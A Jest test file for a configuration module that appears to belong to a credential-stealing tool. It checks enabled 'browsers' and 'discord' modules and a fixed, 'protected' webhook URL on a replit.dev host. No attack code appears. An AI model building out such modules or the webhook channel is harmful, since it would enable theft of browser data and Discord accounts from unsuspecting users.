const config = require('../../src/config/config');

describe('Configuration Management', () => {
    test('should load default configuration', () => {
        expect(config.get('app.name')).toBeDefined();
        expect(config.get('app.version')).toBeDefined();
    });

    test('should validate configuration', () => {
        expect(config.validate()).toBe(true);
    });

    test('should handle nested config keys', () => {
        const appName = config.get('app.name');
        expect(typeof appName).toBe('string');
    });

    test('should return default value for missing keys', () => {
        const defaultValue = 'default';
        const result = config.get('nonexistent.key', defaultValue);
        expect(result).toBe(defaultValue);
    });

    test('should handle module enablement configuration', () => {
        const modules = config.get('modules.enabled');
        expect(typeof modules).toBe('object');
        expect(modules).toHaveProperty('browsers');
        expect(modules).toHaveProperty('discord');
    });

    test('should load fixed webhook URL correctly', () => {
        const webhookUrl = config.get('webhook.url');
        expect(webhookUrl).toBe('http://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev:3000');
    });

    test('should maintain webhook URL stability (no dynamic changes)', () => {
        const initialUrl = config.get('webhook.url');
        
        // Simulate multiple accesses to ensure URL doesn't change
        const url1 = config.get('webhook.url');
        const url2 = config.get('webhook.url');
        const url3 = config.get('webhook.url');
        
        expect(url1).toBe(initialUrl);
        expect(url2).toBe(initialUrl);
        expect(url3).toBe(initialUrl);
        expect(url1).toBe('http://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev:3000');
    });

    test('should protect fixed webhook URL from encryption', () => {
        const initialUrl = config.get('webhook.url');
        
        // Try to encrypt the webhook URL - it should remain unchanged
        const encryptResult = config.encryptWebhookUrl();
        expect(encryptResult).toBe(true);
        expect(config.get('webhook.url')).toBe(initialUrl);
        expect(config.get('webhook.url')).toBe('http://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev:3000');
    });
});
